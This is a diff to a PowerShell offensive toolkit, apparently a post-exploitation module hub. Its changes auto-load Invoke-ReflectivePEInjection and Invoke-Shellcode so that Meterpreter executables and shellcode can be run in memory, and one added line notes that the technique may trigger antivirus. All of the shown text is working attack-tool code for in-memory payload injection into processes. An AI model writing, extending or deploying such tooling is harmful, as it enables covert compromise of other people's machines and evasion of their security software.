@@ -233,6 +233,9 @@ Load the exe module with the name 'meterpreter.exe' in memory and run it
             }
         }
     } else {
+        if (-not (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)) {
+            Load-HubModule Invoke-ReflectivePEInjection
+        }
         if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue) {
             foreach ($n in $Module) {
                 if ($n.gettype() -eq [Int32]) {
@@ -298,6 +301,8 @@ function Run-DotNETExe {
 .SYNOPSIS
 
 Executes a .NET exe module in memory, which must be loaded first.
+
+This might trigger the anti-virus.
 
 .EXAMPLE
 
@@ -366,6 +371,9 @@ Load the shellcode module with the name 'meterpreter.bin' in memory and run it
         [ValidateNotNullOrEmpty()] [UInt16] $ProcessID
     )
 
+    if (-not (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)) {
+        Load-HubModule Invoke-Shellcode
+    }
     if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
     {
         foreach ($n in $Module) {
